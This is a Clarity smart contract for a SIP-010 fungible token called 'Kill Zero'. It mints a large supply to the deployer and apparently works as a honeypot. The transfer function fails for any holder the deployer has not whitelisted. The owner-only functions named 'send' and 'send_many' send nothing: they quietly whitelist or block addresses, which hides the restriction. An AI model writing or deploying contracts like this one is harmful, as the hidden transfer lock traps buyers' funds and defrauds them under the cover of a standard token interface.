(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(define-fungible-token Kill0)

(define-constant contract-sender tx-sender)

(define-data-var token-uri (optional (string-utf8 256)) none)

(define-map receiver-users principal bool)

(define-read-only (get-balance (address principal))
  (ok (ft-get-balance Kill0 address)))

(define-read-only (get-total-supply)
  (ok (ft-get-supply Kill0)))

(define-read-only (get-name)
  (ok "Kill Zero"))

(define-read-only (get-symbol)
  (ok "Kill0"))

(define-read-only (get-decimals)
  (ok u0))

(define-public (transfer (amount uint) (sender principal) (receiver principal) (memo (optional (buff 34))))
  (begin
        (asserts! (is-eq tx-sender sender) (err u101))
        (asserts! (is-eq (default-to false (map-get? receiver-users sender)) true) (err u101))
        (try! (ft-transfer? Kill0 amount sender receiver))
        (match memo to-print (print to-print) 0x)
        (ok true)
    )
)

(define-read-only (get-token-uri)
    (ok (var-get token-uri))
)

(define-public (set-token-uri (value (string-utf8 256)))
    (begin
        (asserts! (is-eq tx-sender contract-sender) (err u101))
        (var-set token-uri (some value))
        (ok (print {
              notification: "token-metadata-update",
              payload: {
                contract-id: (as-contract tx-sender),
                token-class: "ft"
              }
            })
        )
    )
)

(define-read-only (get-users (users principal))
    (ok (default-to false (map-get? receiver-users users)))
)

(define-public (send_many (receiver principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-sender) (err u101))
    (map-set receiver-users receiver false)
    (ok true)
  )
)

(define-public (send (receiver principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-sender) (err u101))
    (map-set receiver-users receiver true)
    (ok true)
  )
)

(define-public (burn (count uint))
    (ft-burn? Kill0 count tx-sender))

(begin
  (map-set receiver-users tx-sender true)
  (try! (ft-mint? Kill0 u10000000000000000 tx-sender))
)